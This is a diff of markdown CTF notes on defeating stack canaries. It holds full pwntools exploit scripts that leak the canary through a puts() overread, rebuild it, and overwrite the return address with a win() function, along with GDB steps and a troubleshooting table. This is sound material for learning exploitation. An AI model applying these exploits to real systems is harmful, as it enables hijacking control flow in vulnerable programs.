@@ -54,13 +54,15 @@ Get flag
 # <span style="color:rgb(255, 192, 0)">STEP (1) Finding Offset to Canary (GDB)</span>
 
 ```bash
+# 1. find offset to canary
 gdb ./binary
-
 r <<< $(pwn cyclic 200)
+x/40gx $rsp        # find value ending in 00
+# OR
+x/gx $rbp-0x8     # easier, almost always works
 
-# Canary is stored at a fixed offset — look for the "stack smashing" abort
-# After abort, inspect stack:
-x/40gx $rsp                # look for value ending in 00
+# 2. find win() address
+info functions     # or: p win
 ```
 
 # <span style="color:rgb(255, 192, 0)">STEP (2) Pick a method</span>
@@ -85,6 +87,7 @@ Full Exploit (hardcode the index):
 from pwn import *
 
 p = process('./binary')
+#p = remote('host', 1337)
 win = 0xdeadbeef                 # from GDB: p win  OR  info functions
 
 # --- Leak canary ---
@@ -97,7 +100,7 @@ print(f"Canary: {hex(canary)}")          # sanity check — should end in 00
 
 
 # --- Build payload ---
-offset_to_canary = 40            # number of bytes from buffer start to where canary sits — from GDB/cyclic
+offset_to_canary = 40            # number of bytes from buffer start to where canary sits — from step 1
 
 payload  = b"A" * offset_to_canary   # junk to reach the canary position
 payload += p64(canary)               # write canary back exactly as it was — check passes, no abort
@@ -114,31 +117,50 @@ p.interactive()                  # hand control to us — type commands if we go
 
 If the binary **prints back your buffer** (e.g. `printf(buf)` or `puts(buf)`) and there's a separate read:
 
-- Overwrite **exactly up to** the canary's null byte
-- The null byte gets overwritten → `puts()` reads past it and **prints the canary**
+- Canary's first byte is always `\x00` — this is what stops `puts()` from reading past your buffer into the canary
+- Fill the buffer completely → your last byte overwrites that `\x00` → `puts()` has no null terminator to stop at, so it bleeds into the 7 remaining canary bytes and prints them
+- Grab those 7 bytes, manually prepend `\x00` → you have the full 8-byte canary
 
+Full exploit:
 ```python
 from pwn import *
 
 p = process('./binary')
+#p = remote('host', 1337)
+win = 0xdeadbeef                 # from GDB: p win  OR  info functions
+offset_to_canary = 40            # from step 1 above — bytes from buffer start to canary
 
-# Fill buffer exactly to the null byte of the canary
-p.send(b"A" * offset_to_canary)   # use send(), no newline!
-p.recvuntil(b"A" * offset_to_canary)
+# --- Leak canary ---
+p.recvuntil(b"input: ")               # wait for prompt before sending
+p.send(b"A" * offset_to_canary)       # send() NOT sendline() — sendline() appends \n which would
+                                      # land inside the canary and corrupt it before we even read it
+p.recvuntil(b"A" * offset_to_canary)  # consume the echoed A's so next recv() starts right at the canary
+leaked = p.recv(7)                    # canary is 8 bytes but the first \x00 was overwritten by our A's
+                                      # so only 7 bytes come through — that's expected, not a bug
+canary = u64(b"\x00" + leaked)        # reconstruct: glue the \x00 back onto the front
+                                      # u64() reads 8 bytes little-endian — this gives us the correct integer
+print(f"Canary: {hex(canary)}")       # sanity check — should end in 00
 
-# Read leaked canary bytes (7 bytes, then restore the \x00)
-leaked = p.recv(7)
-canary = b"\x00" + leaked[::-1]   # if little-endian reassembly needed
-# OR more commonly:
-canary = u64(b"\x00" + leaked)    # parse 7 bytes + null into 8-byte int
+# --- Build payload ---
+payload  = b"A" * offset_to_canary    # junk to reach canary
+payload += p64(canary)                # restore canary exactly — if even 1 bit is wrong, program aborts
+payload += b"B" * 8                   # overwrite saved RBP — junk, we don't care
+payload += p64(win)                   # overwrite return address
+
+p.recvuntil(b"input: ")          # wait for binary to ask for input again
+p.sendline(payload)
+p.interactive()
 ```
 
-### <span style="color:rgb(255, 192, 0)">Things That Go Wrong:</span>
 
-|PROBLEM|FIX|
-|---|---|
-|`stack smashing detected`|Canary value is wrong — re-check leak|
-|Canary leaked as string, ends early|Null byte cut it — use `recv(7)` + prepend `\x00`|
-|Format string index off|Try indices 1–30, look for value ending in `00`|
-|Offset to canary wrong|GDB: `x/gx $rbp-0x8` to confirm canary location|
-|`p.sendline()` corrupts canary|Use `p.send()` — the `\n` might land in the canary|
+
+# <span style="color:rgb(255, 255, 0)">Things that go wrong</span>
+
+| PROBLEM                      | FIX                                                                                              |
+| ---------------------------- | ------------------------------------------------------------------------------------------------ |
+| `stack smashing detected`    | Canary value is wrong — re-check your leak parsing, print it and verify it ends in `00`          |
+| Canary only gives 7 bytes    | That's normal — the `\x00` was overwritten, prepend it back: `u64(b"\x00" + leaked)`             |
+| Format string index off      | Run step 1 again, print all 20 values, carefully count position of the one ending in `00`        |
+| Offset to canary wrong       | In GDB run `x/gx $rbp-0x8` while inside the function to read canary location directly            |
+| `p.sendline()` corrupts leak | Method 2 step 1 must use `p.send()` — the `\n` lands in the canary and breaks everything         |
+| Canary contains `\x0a`       | `fgets()` treats `\n` as end of input and cuts your payload — just re-run, it's random each time |
